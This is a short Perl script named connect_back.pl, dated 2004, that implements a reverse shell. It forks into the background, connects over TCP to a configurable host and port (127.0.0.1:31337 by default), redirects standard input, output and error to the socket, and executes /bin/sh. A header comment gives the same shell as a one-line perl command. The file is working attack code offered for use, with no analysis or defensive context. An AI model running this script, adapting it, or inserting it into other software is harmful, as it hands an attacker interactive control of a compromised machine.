#!/usr/bin/perl

# perl -e "use Socket;fork and exit 0;socket S,PF_INET,SOCK_STREAM,getprotobyname'tcp';connect S,sockaddr_in(31337,inet_aton '127.0.0.1');open STDIN,'>&S';open STDOUT,'<&S';open STDERR,'>&S';exec'/bin/sh';"
#
# (C) Copyright Claes M Nyberg <md0claes@mdstud.chalmers.se> 2004
#
# $Id: connect_back.pl,v 1.1.1.1 2004-12-14 20:27:23 cmn Exp $


use strict;
use Socket;

my $port = 31337;
my $target = "127.0.0.1";

# Detach
if (fork() != 0) { exit(0); }

socket(TARGET, PF_INET, SOCK_STREAM, getprotobyname('tcp'))  or 
	die("socket(): $!");

connect(TARGET, sockaddr_in($port,inet_aton($target))) or die("connect(): $!");

open(STDIN, '<&TARGET');
open(STDOUT, '>&TARGET');	
open(STDERR, '>&TARGET');	
exec('/bin/sh'); 
die("exec(): $!");

